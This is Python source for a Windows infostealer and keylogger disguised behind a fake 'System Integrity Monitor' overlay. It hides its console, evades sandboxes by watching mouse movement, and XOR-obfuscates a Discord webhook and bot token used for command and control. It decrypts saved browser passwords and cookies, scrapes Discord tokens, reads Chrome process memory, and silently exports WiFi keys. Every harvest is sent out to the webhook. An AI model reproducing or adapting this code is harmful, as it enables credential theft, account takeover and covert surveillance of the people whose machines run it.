# CRITICAL: Hide console window IMMEDIATELY (before any imports)
import sys
import ctypes

if getattr(sys, 'frozen', False):
    # Running as compiled exe - hide console window
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    
    # Get console window handle
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        # SW_HIDE = 0
        user32.ShowWindow(hwnd, 0)

import logging
import os
import platform
import socket
import threading
from threading import Thread, Timer
import wave
import json
import base64
import sqlite3
import shutil
from datetime import datetime
import time # Added for anti-sandbox

import subprocess

# CORE IMPORTS MOVED TO LOCAL SCOPE TO PREVENT RECURSION
pass

# OVERLAY IMPORTS
OVERLAY_AVAILABLE = True
OVERLAY_ERROR = None
try:
    import psutil
    from threading import Thread, Timer
    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
    from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QPoint, QRectF, QRect
    from PyQt5.QtGui import QFont, QColor, QPalette, QPainter, QPen, QBrush, QLinearGradient, QConicalGradient
    import random
except Exception as e:
    OVERLAY_AVAILABLE = False
    OVERLAY_ERROR = str(e)
    class QMainWindow: pass
    class QWidget: pass
    class QApplication: pass
    class QPainter: pass 
    class QRectF: pass
    Qt = None
IMPORT_ERROR = None



# SINGLE INSTANCE LOCK (FAIL SAFE)
# This prevents the "Endless Opening" issue by ensuring only ONE instance runs.
try:
    kernel32 = ctypes.windll.kernel32
    # Local mutex to avoid permissions issues
    mutex = kernel32.CreateMutexW(None, False, "StarkCoreServices_Mutex_v23_Local")
    
    # Check if mutex already exists (Error 183)
    # ALSO check if mutex handle creation failed completely (0)
    last_error = kernel32.GetLastError()
    
    if last_error == 183: # ERROR_ALREADY_EXISTS
        sys.exit(0)
        
except Exception as e:
    # Failsafe: If we can't create a mutex, we might be unstable.
    # But in this case, we default to running (Fail Open) to ensure persistence works
    # EXCEPT if we suspect we are a recursive child
    pass 
 

# ... (omitted code) ...


finally:
    # --- STEALTH HELPERS ---
    def xor_dec(hex_str, key):
        import time # Ensure imported
        try:
            s = bytes.fromhex(hex_str).decode('latin1')
            return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(s))
        except:
                return ""

    def anti_sandbox():
        try:
            # 1. Mouse Movement Check
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            
            pt1 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))
            time.sleep(1.5) # Wait a bit
            pt2 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
            
            if pt1.x == pt2.x and pt1.y == pt2.y:
                # No movement. WaitLoop.
                start = time.time()
                # Wait up to 20 seconds for ANY movement
                while time.time() - start < 20:
                        ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
                        if (abs(pt1.x - pt2.x) > 5) or (abs(pt1.y - pt2.y) > 5):
                            break # Moved
                        time.sleep(0.5)
                else:
                        # Still no movement? Goodbye.
                        sys.exit(0)

            # 2. RAM Check (Sandboxes usually have small RAM)
            # if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            #     sys.exit(0)
                
        except: pass


    # Encrypted Constants (XOR-ed)
    # KEY: stark_industries_v3
    XOR_KEY = "stark_industries_v3"
    
    # URL: https://discord.com/api/webhooks/1453457035138961591/1RmgOridgcYqYr0mVduh55O2WOGekvTcg7C8OFb-GH7gDVd7gTiMPise8_kqkexHl6k1
    ENCRYPTED_URL = "1b00150218654641001c00171d1b015d3c195e5c15111b44280c0c0c1a1c1f014654476a4507464351415e6e5a565d4342414b584a420d1b543c0608160c3c301f3d074319240d101b6a437c41232e350e341f3a071244374a26231172317b441325240f680e3a0d38231d010c5d2c340758160c291e5d3458"
    
    # TOKEN: MTQ1MjkzMz...
    ENCRYPTED_TOKEN = "3e20304326350214290f2a033f032846122272463a1b235a10284023300b261a3b4b10083a591e380c061e161b2c3e4d4a430a581c24283772250d360b3272065f553339103c333c"
    
    WEBHOOK_URL = xor_dec(ENCRYPTED_URL, XOR_KEY)

    SEND_REPORT_EVERY = 20 # Reporting interval in seconds
    VERSION = "4.0"
    # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
    VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
    EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"


    class SystemOverlay(QMainWindow):
        def __init__(self):
            super().__init__()
            # Window Flags & Attributes
            self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
            self.setAttribute(Qt.WA_TranslucentBackground)
            self.setWindowOpacity(0.0)

            # --- DYNAMIC GEOMETRY (20-25% Width) ---
            screen_rect = QApplication.desktop().screenGeometry()
            s_w, s_h = screen_rect.width(), screen_rect.height()
            
            # Target width: 22% of screen
            self.w_width = int(s_w * 0.22)
            # Minimum width clamp
            if self.w_width < 350: self.w_width = 350
            
            self.w_height = 450 # Taller for data streams
            
            # Align Top Right with margin
            self.setGeometry(s_w - self.w_width - 40, 50, self.w_width, self.w_height)

            # State Variables
            self.rotation_angle = 0
            self.hex_lines = []
            self.show_hex = False
            self.show_reactor = False
            self.show_modules = False
            self.is_first_run = self.check_first_run()
            
            # Data
            self.cpu_val = 0
            self.ram_val = 0
            self.network_status = "CONNECTING"
            self.start_time = datetime.now()
            
            # Generate random hex lines initially
            self.update_hex_lines()

            # --- ANIMATION TIMERS ---
            
            # 1. Rendering Timer (60 FPS approx) - For Rotation
            self.anim_timer = QTimer(self)
            self.anim_timer.timeout.connect(self.update_animation_step)
            self.anim_timer.start(30)
            
            # 2. Data Timer (Slower)
            self.data_timer = QTimer(self)
            self.data_timer.timeout.connect(self.update_data)
            self.data_timer.start(800)
            
            # 3. Hex Stream Update Timer
            self.hex_timer = QTimer(self)
            self.hex_timer.timeout.connect(self.update_hex_lines)
            self.hex_timer.start(150)

            # --- CINEMATIC SEQUENCE TIMELINE (10s) ---
            
            # 0.0s: Fade In
            self.anim_in = QPropertyAnimation(self, b"windowOpacity")
            self.anim_in.setDuration(800)
            self.anim_in.setStartValue(0.0)
            self.anim_in.setEndValue(1.0)
            self.anim_in.start()
            
            # 1.0s: Reactor Spin Up
            QTimer.singleShot(1000, lambda: setattr(self, 'show_reactor', True))
            
            # 2.0s: Hex Streams Start
            QTimer.singleShot(2000, lambda: setattr(self, 'show_hex', True))
            
            # 3.0s: Modules Pop
            QTimer.singleShot(3000, lambda: setattr(self, 'show_modules', True))
            
            # 10.0s: Fade Out (End)
            QTimer.singleShot(10000, self.fade_out) 

            self.update_data()
            
        def check_first_run(self):
            marker_path = os.path.join(os.getenv('TEMP'), 'stark_core_v2.run')
            if not os.path.exists(marker_path):
                try:
                    with open(marker_path, 'w') as f: f.write("1")
                except: pass
                return True
            return False

        def update_animation_step(self):
            self.rotation_angle += 5
            if self.rotation_angle >= 360: self.rotation_angle = 0
            self.update()

        def update_hex_lines(self):
            # Generate random "code" lines
            chars = "ABCDEF0123456789"
            lines = []
            for _ in range(8):
                line = "".join(random.choice(chars) for _ in range(16))
                lines.append(f"0x{line} :: MEM_ALLOC")
            self.hex_lines = lines
            if self.show_hex: self.update()

        def update_data(self):
            self.cpu_val = psutil.cpu_percent()
            self.ram_val = psutil.virtual_memory().percent
            self.network_status = "SECURE" if psutil.net_if_stats() else "SCANNING"

        def fade_out(self):
            self.anim_out = QPropertyAnimation(self, b"windowOpacity")
            self.anim_out.setDuration(800)
            self.anim_out.setStartValue(1.0)
            self.anim_out.setEndValue(0.0)
            self.anim_out.finished.connect(self.close)
            self.anim_out.start()

        def paintEvent(self, event):
            painter = QPainter(self)
            painter.setRenderHint(QPainter.Antialiasing)
            rect = self.rect()
            
            # Colors
            cyan = QColor(0, 255, 255)
            # cyan_dim = QColor(0, 255, 255, 40)
            blue_bg = QColor(5, 10, 20, 245) # Darker
            
            # 1. Main Background
            painter.setBrush(QBrush(blue_bg))
            painter.setPen(Qt.NoPen)
            painter.drawRect(rect)
            
            # 2. Tech Frame (Outer Bracket)
            self.draw_tech_frame(painter, 5, 5, self.w_width-10, self.w_height-10, cyan)
            
            # 3. Header Bar
            painter.setBrush(QBrush(QColor(0, 255, 255, 30)))
            painter.setPen(Qt.NoPen)
            # Top header block
            painter.drawRect(20, 15, self.w_width-40, 30)
            
            # Title
            k_font = QFont("Segoe UI", 11, QFont.Bold)
            k_font.setLetterSpacing(QFont.AbsoluteSpacing, 1)
            painter.setFont(k_font)
            painter.setPen(cyan)
            painter.drawText(QRect(0, 15, self.w_width, 30), Qt.AlignCenter, "SYSTEM INTEGRITY MONITOR // V3.0")

            # --- MODULES ---
            
            # 4. Data Box (Left)
            if self.show_hex:
                 self.draw_module_box(painter, 20, 60, 200, 140, "DATA STREAM")
                 
                 hex_font = QFont("Consolas", 7)
                 painter.setFont(hex_font)
                 painter.setPen(QColor(0, 200, 200, 200))
                 
                 y_start = 95
                 for line in self.hex_lines[:6]:
                     painter.drawText(30, y_start, line)
                     y_start += 12

            # 5. System Stats Box (Bottom Left)
            if self.show_modules:
                self.draw_module_box(painter, 20, 210, 200, 100, "SYSTEM STATS")
                
                painter.setFont(QFont("Consolas", 8))
                painter.setPen(QColor(255, 255, 255, 220))
                
                uptime = datetime.now() - self.start_time
                uptime_str = str(uptime).split('.')[0]
                
                y = 235
                painter.drawText(30, y, f"OS: WINDOWS NT")
                painter.drawText(30, y+15, f"REL: {platform.release()}")
                painter.drawText(30, y+30, f"UP: {uptime_str}")
                painter.drawText(30, y+45, f"USR: {os.getenv('USERNAME').upper()}")
                
            # 6. Reactor/Reticle (Top Right)
            if self.show_reactor:
                r_x, r_y = 280, 130 # Center point
                
                # Draw Box Frame for Reticle
                self.draw_module_box(painter, 230, 60, 150, 140, "TARGETING")
                
                painter.save()
                painter.translate(r_x + 25, r_y) # Center inside the box (roughly)
                
                # Crosshair Lines (Fixed)
                painter.setPen(QPen(QColor(0, 255, 255, 100), 1))
                painter.drawLine(-60, 0, 60, 0)
                painter.drawLine(0, -60, 0, 60)
                
                # Rotating Outer Ring
                painter.rotate(self.rotation_angle)
                painter.setPen(QPen(cyan, 2))
                painter.setBrush(Qt.NoBrush)
                painter.drawEllipse(-35, -35, 70, 70)
                # Ticks
                for _ in range(4):
                    painter.drawLine(35, 0, 45, 0)
                    painter.rotate(90)
                
                # Rotating Inner Ring (Counter)
                painter.rotate(-self.rotation_angle * 2)
                painter.setPen(QPen(cyan, 1))
                painter.drawEllipse(-20, -20, 40, 40)
                painter.drawRect(-10, -10, 20, 20)
                
                painter.restore()

            # 7. Progress Bars (Bottom Right)
            if self.show_modules:
                 self.draw_module_box(painter, 230, 210, 150, 100, "RESOURCES")
                 
                 # CPU
                 painter.setFont(QFont("Consolas", 8))
                 painter.setPen(cyan)
                 painter.drawText(240, 235, f"CPU: {int(self.cpu_val)}%")
                 self.draw_segmented_bar(painter, 240, 240, 130, 6, self.cpu_val, cyan)
                 
                 # RAM
                 painter.drawText(240, 265, f"RAM: {int(self.ram_val)}%")
                 self.draw_segmented_bar(painter, 240, 270, 130, 6, self.ram_val, cyan)
                 
                 # STATUS
                 painter.setFont(QFont("Impact", 14))
                 painter.setPen(QColor(0, 255, 0) if self.network_status == "SECURE" else QColor(255, 100, 0))
                 painter.drawText(240, 300, self.network_status)

        # --- Helper Drawing Functions ---
        def draw_tech_frame(self, p, x, y, w, h, color):
            p.setPen(QPen(color, 2))
            p.setBrush(Qt.NoBrush)
            
            # Tech Bracket Shape (Chamfered corners)
            corner = 15
            
            from PyQt5.QtGui import QPolygon
            points = [
                QPoint(x + corner, y),
                QPoint(x + w - corner, y),
                QPoint(x + w, y + corner),
                QPoint(x + w, y + h - corner),
                QPoint(x + w - corner, y + h),
                QPoint(x + corner, y + h),
                QPoint(x, y + h - corner),
                QPoint(x, y + corner)
            ]
            p.drawPolygon(QPolygon(points))
            
            # Corner Accents (Thicker)
            p.setPen(QPen(color, 3))
            len_ = 20
            # Top Left
            p.drawLine(x, y + corner, x, y + corner + len_)
            p.drawLine(x + corner, y, x + corner + len_, y)
            # Bottom Right
            p.drawLine(x + w, y + h - corner, x + w, y + h - corner - len_)
            p.drawLine(x + w - corner, y + h, x + w - corner - len_, y + h)

        def draw_module_box(self, p, x, y, w, h, title):
            # Thin background
            p.setBrush(QBrush(QColor(0, 50, 50, 100)))
            p.setPen(Qt.NoPen)
            # p.drawRect(x, y, w, h)
            
            # Tech Frame
            self.draw_tech_frame(p, x, y, w, h, QColor(0, 255, 255, 100))
            
            # Small Header
            p.setBrush(QBrush(QColor(0, 255, 255, 50)))
            p.drawRect(x+5, y+5, 100, 15)
            
            p.setFont(QFont("Segoe UI", 7, QFont.Bold))
            p.setPen(QColor(0, 255, 255))
            p.drawText(x+10, y+16, title)

        def draw_segmented_bar(self, p, x, y, w, h, val, color):
            total_segs = 15
            seg_w = (w - (total_segs-1)*2) / total_segs
            
            filled_segs = int((val / 100.0) * total_segs)
            
            for i in range(total_segs):
                sx = x + i * (seg_w + 2)
                
                if i < filled_segs:
                    p.setBrush(QBrush(color))
                    p.setPen(Qt.NoPen)
                else:
                    p.setBrush(QBrush(QColor(0, 50, 50))) # Dark
                    p.setPen(Qt.NoPen)
                    
                p.drawRect(int(sx), int(y), int(seg_w), int(h))


    class KeyLogger:
        def __init__(self, time_interval, webhook_url):
            self.interval = time_interval
            self.webhook_url = webhook_url
            self.version = VERSION
            self.log = ""
            self.current_window = None
            self.last_dump_time = {} # Track last cookie dump time for sites
            # Define target keywords for reactive session stealing
            # Added generic terms to catch Login pages even if domain isn't explicitly listed
            self.targets = [
                "facebook", "twitter", "instagram", "gmail", "google", "linkedin", "amazon", "netflix", "paypal", "bank", "reddit", 
                "flipkart", "github", "stackoverflow", "youtube", "vercel", "heroku", "netlify",
                "login", "signin", "sign in", "admin", "dashboard", "account", "user", "shop", "store", "civic"
            ]
            
            # Forum Thread ID Storage
            self.thread_id = None
            self.thread_lock = threading.Lock()
            
            # C2 State
            self.last_command_id = None
            self.bot_token = xor_dec(ENCRYPTED_TOKEN, XOR_KEY)
            
            # Cache Victim ID once
            import os, platform
            try:
                self.victim_id = f"{os.getlogin()} | {platform.node()}"
            except: 
                self.victim_id = "UNKNOWN_USER"
            
            # Chrome Monitor State
            self.chrome_monitored = False
            self.last_chrome_dump = 0  # Timestamp of last dump
            
        def get_active_window_title(self):
            try:
                window = ctypes.windll.user32.GetForegroundWindow()
                if not window:
                    return "Zero Active Window Handle"
                length = ctypes.windll.user32.GetWindowTextLengthW(window)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(window, buff, length + 1)
                return buff.value if buff.value else "Empty Title"
            except Exception as e:
                return f"Window Title Error: {e}"
            

        def get_encryption_key(self):
            # Legacy method support
            try:
                path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
                return self.get_master_key(path)
            except: return None

        def decrypt_password(self, password, key):
            try:
                if not password: return ""
                
                # Check for v20 (Chrome 127+)
                if password.startswith(b'v20'):
                    # v20 structure: 'v20' (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
                    nonce = password[3:15]
                    ciphertext_and_tag = password[15:]
                    
                    from Crypto.Cipher import AES
                    
                    # Try method 1: Standard AES-GCM with separate tag
                    try:
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        ciphertext = ciphertext_and_tag[:-16]
                        tag = ciphertext_and_tag[-16:]
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        return decrypted.decode('utf-8', errors='replace')
                    except:
                        pass
                    
                    # Try method 2: Decrypt without verification
                    try:
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt(ciphertext_and_tag[:-16])
                        return decrypted.decode('utf-8', errors='replace')
                    except:
                        pass
                    
                    # Try method 3: Different nonce position (some v20 variants)
                    try:
                        # Some v20 implementations use nonce at different position
                        nonce_alt = password[3:15]
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce_alt)
                        # Try decrypting everything after nonce
                        decrypted = cipher.decrypt(password[15:-16])
                        result = decrypted.decode('latin-1')
                        # Check if result looks valid (printable ASCII)
                        if all(32 <= ord(c) <= 126 or c in '\r\n\t' for c in result):
                            return result
                    except:
                        pass
                    
                    return f"[v20 Decrypt Failed - Garbled Output]"
                
                # Check for v10 (Chrome 80-126)
                elif password.startswith(b'v10'):
                    # v10 format: v10 + nonce(12) + ciphertext + tag(16)
                    iv = password[3:15]
                    payload = password[15:]
                    
                    from Crypto.Cipher import AES
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decrypted = cipher.decrypt(payload)
                    decrypted = decrypted[:-16]  # Strip tag
                    return decrypted.decode('utf-8', errors='replace')
                
                # Fallback to legacy DPAPI (Chrome < 80)
                else:
                    try:
                        import win32crypt
                        return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8', errors='replace')
                    except Exception as e:
                        return f"[Legacy DPAPI Failed: {e}]"
                        
            except Exception as e:
                return f"[Decryption Error: {e}]"

        def get_master_key(self, browser_path):
            import json
            import base64
            import win32crypt
            import shutil
            try:
                # Copy Local State to temp to avoid lock
                local_state_path = os.path.join(browser_path, "Local State")
                tmp_ls = os.path.join(os.getenv('TEMP'), "ls_temp.json")
                try: shutil.copy2(local_state_path, tmp_ls)
                except: return None # Can't access Local State
                
                with open(tmp_ls, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                
                os.remove(tmp_ls)
                
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                
                if master_key.startswith(b"DPAPI"):
                    master_key = master_key[5:]
                
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            except: return None

        def dump_chromium_creds(self, full_dump=False, cookies=False):
            import sqlite3
            import shutil
            import tempfile
            
            browsers = {
                'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
                'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
                'Brave': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data')
            }
            
            for name, path in browsers.items():
                if not os.path.exists(path): continue
                
                master_key = self.get_master_key(path)
                if not master_key:
                    self.send_to_webhook(f">> ❌ Could not get Master Key for {name}")
                    continue
                
                profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
                for profile in profiles:
                    profile_path = os.path.join(path, profile)
                    if not os.path.exists(profile_path): continue
                    
                    # --- PASSWORDS ---
                    if not cookies:
                        login_db = os.path.join(profile_path, "Login Data")
                        if os.path.exists(login_db):
                            try:
                                tmp_db = os.path.join(tempfile.gettempdir(), f"Login_{name}_{profile}.db")
                                try: self.force_copy(login_db, tmp_db)
                                except: shutil.copy2(login_db, tmp_db)
                                
                                conn = sqlite3.connect(tmp_db)
                                cursor = conn.cursor()
                                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                                
                                results = []
                                for r in cursor.fetchall():
                                    url = r[0]
                                    username = r[1]
                                    encrypted_password = r[2]
                                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
                                    
                                    if username or (decrypted_password and "Failed" not in decrypted_password):
                                        results.append(f"URL: {url}\nUse: {username}\nPwd: {decrypted_password}\n")
                                
                                cursor.close()
                                conn.close()
                                os.remove(tmp_db)
                                
                                if results:
                                    file_content = "\n".join(results)
                                    temp_file = os.path.join(tempfile.gettempdir(), f"{name}_{profile}_Passwords.txt")
                                    with open(temp_file, "w", encoding='utf-8') as f: f.write(file_content)
                                    self.send_to_webhook(f"🔑 **{name} Passwords** ({profile})", file_path=temp_file)
                                    
                            except Exception as e:
                                self.send_to_webhook(f">> ❌ Error processing {name} {profile}: {e}")

                    # --- COOKIES ---
                    if cookies:
                        try:
                            # Chrome stores cookies in Network\Cookies (newer) or Cookies (older)
                            db_path = os.path.join(profile_path, "Network", "Cookies")
                            if not os.path.exists(db_path):
                                db_path = os.path.join(profile_path, "Cookies")
                            
                            if not os.path.exists(db_path):
                                self.send_to_webhook(f">> ⚠️ {name} {profile}: Cookies DB not found")
                                continue
                            
                            temp_db = os.path.join(tempfile.gettempdir(), f"{name}_{profile}_cookies.db")
                            self.force_copy(db_path, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                            
                            cookies_data = []
                            for row in cursor.fetchall():
                                host, cookie_name, enc_value, path, expires, secure, httponly = row
                                
                                # Decrypt cookie value
                                try:
                                    if enc_value and enc_value.startswith(b'v10'):
                                        decrypted = self.decrypt_password(enc_value, master_key)
                                    else:
                                        decrypted = enc_value.decode('utf-8', errors='ignore') if isinstance(enc_value, bytes) else str(enc_value)
                                except:
                                    decrypted = "[Encrypted]"
                                
                                # Create clean cookie object
                                cookie_obj = {
                                    "domain": host,
                                    "name": cookie_name,
                                    "value": decrypted,
                                    "path": path,
                                    "expires": expires,
                                    "secure": bool(secure),
                                    "httpOnly": bool(httponly)
                                }
                                cookies_data.append(cookie_obj)
                            
                            conn.close()
                            os.remove(temp_db)
                            
                            if cookies_data:
                                # Save as JSON for easy import
                                import json
                                temp_file = os.path.join(tempfile.gettempdir(), f"{name}_{profile}_Cookies.json")
                                with open(temp_file, "w", encoding='utf-8') as f:
                                    json.dump(cookies_data, f, indent=2)
                                
                                # Also create a summary
                                summary = f"📊 {name} - {profile}\n"
                                summary += f"Total Cookies: {len(cookies_data)}\n\n"
                                
                                # Group by domain
                                domains = {}
                                for cookie in cookies_data:
                                    domain = cookie['domain']
                                    if domain not in domains:
                                        domains[domain] = []
                                    domains[domain].append(cookie['name'])
                                
                                summary += "🌐 Domains:\n"
                                for domain, names in sorted(domains.items())[:20]:  # Top 20 domains
                                    summary += f"  • {domain} ({len(names)} cookies)\n"
                                
                                self.send_to_webhook(summary)
                                self.send_to_webhook(f"🍪 **{name} Cookies** ({profile})", file_path=temp_file)
                            else:
                                self.send_to_webhook(f">> ℹ️ {name} {profile}: No cookies found")

                        except Exception as e:
                            self.send_to_webhook(f">> ❌ Cookie error ({name} {profile}): {str(e)}")



        def dump_discord_tokens(self):
            import re
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            paths = {
                'Discord': roaming + '\\Discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Discord PTB': roaming + '\\discordptb',
                'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
            }
            
            all_tokens = []
            
            for platform, path in paths.items():
                path += '\\Local Storage\\leveldb'
                if not os.path.exists(path): continue
                
                for file_name in os.listdir(path):
                    if not file_name.endswith('.ldb') and not file_name.endswith('.log'): continue
                    
                    try:
                        with open(path + f"\\{file_name}", "r", errors='ignore') as f:
                            for line in f.readlines():
                                # Regex for Normal Tokens and MFA Tokens
                                regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
                                for token in re.findall(regex, line.strip()):
                                    if token not in all_tokens:
                                        all_tokens.append(token)
                    except: pass
            
            if all_tokens:
                token_str = "\n".join(all_tokens)
                self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
            if all_tokens:
                token_str = "\n".join(all_tokens)
                self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
            else:
                self.send_to_webhook(">> ❌ No Discord Tokens found.")
                
            if all_tokens:
                token_str = "\n".join(all_tokens)
                self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
            if all_tokens:
                token_str = "\n".join(all_tokens)
                self.send_to_webhook(f"🪙 **Found Discord Tokens**:\n```\n{token_str}\n```")
            else:
                self.send_to_webhook(">> ❌ No Discord Tokens found.")
                
        def dump_chrome_memory(self):
            """Extract passwords from Chrome's running process memory"""
            import ctypes
            from ctypes import wintypes
            import psutil
            import re
            
            try:
                # Find Chrome processes
                chrome_pids = []
                for proc in psutil.process_iter(['pid', 'name']):
                    if 'chrome.exe' in proc.info['name'].lower():
                        chrome_pids.append(proc.info['pid'])
                
                if not chrome_pids:
                    self.send_to_webhook(">> ❌ Chrome is not running")
                    return
                
                # Windows API constants
                PROCESS_VM_READ = 0x0010
                PROCESS_QUERY_INFORMATION = 0x0400
                
                # Load kernel32
                kernel32 = ctypes.windll.kernel32
                
                found_creds = []
                
                for pid in chrome_pids:
                    try:
                        # Open process
                        h_process = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
                        if not h_process:
                            continue
                        
                        # Get process memory info
                        mbi = ctypes.create_string_buffer(48)  # MEMORY_BASIC_INFORMATION size
                        address = 0
                        
                        while address < 0x7FFFFFFF:  # Scan user-mode memory
                            if kernel32.VirtualQueryEx(h_process, address, ctypes.byref(mbi), len(mbi)) == 0:
                                break
                            
                            # Extract region info
                            base_address = ctypes.c_void_p.from_buffer(mbi, 0).value
                            region_size = ctypes.c_size_t.from_buffer(mbi, 16).value
                            state = ctypes.c_ulong.from_buffer(mbi, 24).value
                            protect = ctypes.c_ulong.from_buffer(mbi, 28).value
                            
                            # Only scan committed, readable memory
                            MEM_COMMIT = 0x1000
                            PAGE_READABLE = 0x02 | 0x04 | 0x08 | 0x10 | 0x20 | 0x40
                            
                            if state == MEM_COMMIT and (protect & PAGE_READABLE):
                                # Read memory region
                                buffer = ctypes.create_string_buffer(region_size)
                                bytes_read = ctypes.c_size_t()
                                
                                if kernel32.ReadProcessMemory(h_process, base_address, buffer, region_size, ctypes.byref(bytes_read)):
                                    # Search for password patterns
                                    data = buffer.raw[:bytes_read.value]
                                    
                                    # Look for common password field patterns
                                    # Pattern: URL followed by username/password within 200 bytes
                                    url_pattern = rb'https?://[^\x00]{10,100}\x00'
                                    urls = re.findall(url_pattern, data)
                                    
                                    for url_match in urls:
                                        url = url_match.decode('utf-8', errors='ignore').strip('\x00')
                                        # Look for potential credentials near this URL
                                        url_pos = data.find(url_match)
                                        context = data[max(0, url_pos-100):url_pos+300]
                                        
                                        # Extract printable strings near URL
                                        strings = re.findall(rb'[\x20-\x7E]{4,50}', context)
                                        if len(strings) >= 2:
                                            potential_user = strings[0].decode('utf-8', errors='ignore')
                                            potential_pass = strings[1].decode('utf-8', errors='ignore') if len(strings) > 1 else ""
                                            
                                            # Basic validation
                                            if '@' in potential_user or len(potential_user) > 3:
                                                cred_str = f"URL: {url}\nUser: {potential_user}\nPass: {potential_pass}"
                                                if cred_str not in found_creds:
                                                    found_creds.append(cred_str)
                            
                            address = base_address + region_size
                        
                        kernel32.CloseHandle(h_process)
                    
                    except Exception as e:
                        continue
                
                if found_creds:
                    import tempfile
                    temp_file = os.path.join(tempfile.gettempdir(), "Chrome_Memory_Dump.txt")
                    with open(temp_file, "w", encoding='utf-8') as f:
                        f.write("\n\n".join(found_creds))
                    self.send_to_webhook(f"🧠 **Chrome Memory Dump** ({len(found_creds)} credentials)", file_path=temp_file)
                else:
                    self.send_to_webhook(">> ℹ️ No credentials found in Chrome memory")
                    
            except Exception as e:
                self.send_to_webhook(f">> ❌ Memory dump error: {e}")


        def dump_wifi_passwords(self):
            """Extract all saved WiFi passwords from Windows"""
            try:
                import tempfile
                import xml.etree.ElementTree as ET
                import subprocess
                
                self.send_to_webhook(">> 📡 Extracting WiFi passwords...")
                
                # Export all WiFi profiles to temp directory (SILENTLY)
                temp_dir = tempfile.gettempdir()
                
                # Create hidden window startup info
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                # Run netsh silently
                subprocess.run(
                    f'netsh wlan export profile key=clear folder="{temp_dir}"',
                    startupinfo=startupinfo,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # Parse XML files for SSIDs and passwords
                wifi_data = []
                for filename in os.listdir(temp_dir):
                    if filename.startswith("Wi-Fi-") and filename.endswith(".xml"):
                        filepath = os.path.join(temp_dir, filename)
                        try:
                            tree = ET.parse(filepath)
                            root = tree.getroot()
                            
                            # Extract SSID
                            ns = {'ns': 'http://www.microsoft.com/networking/WLAN/profile/v1'}
                            ssid = root.find('.//ns:name', ns)
                            
                            # Extract password
                            key = root.find('.//ns:keyMaterial', ns)
                            
                            if ssid is not None:
                                ssid_name = ssid.text
                                password = key.text if key is not None else "[No Password/Open Network]"
                                wifi_data.append(f"SSID: {ssid_name}\nPassword: {password}\n")
                            
                            # Clean up XML file
                            os.remove(filepath)
                        except:
                            pass
                
                if wifi_data:
                    # Create output file
                    output_file = os.path.join(temp_dir, "WiFi_Passwords.txt")
                    with open(output_file, "w", encoding='utf-8') as f:
                        f.write("="*50 + "\n")
                        f.write("WiFi Networks & Passwords\n")
                        f.write("="*50 + "\n\n")
                        f.write("\n".join(wifi_data))
                    
                    self.send_to_webhook(f"📡 **WiFi Passwords** ({len(wifi_data)} networks)", file_path=output_file)
                else:
                    self.send_to_webhook(">> ℹ️ No WiFi networks found")
                    
            except Exception as e:
                self.send_to_webhook(f">> ❌ WiFi dump error: {e}")


        def dump_browser_history(self):
            """Extract browsing history from Chrome/Edge"""
            try:
                import sqlite3
                import tempfile
                from datetime import datetime, timedelta
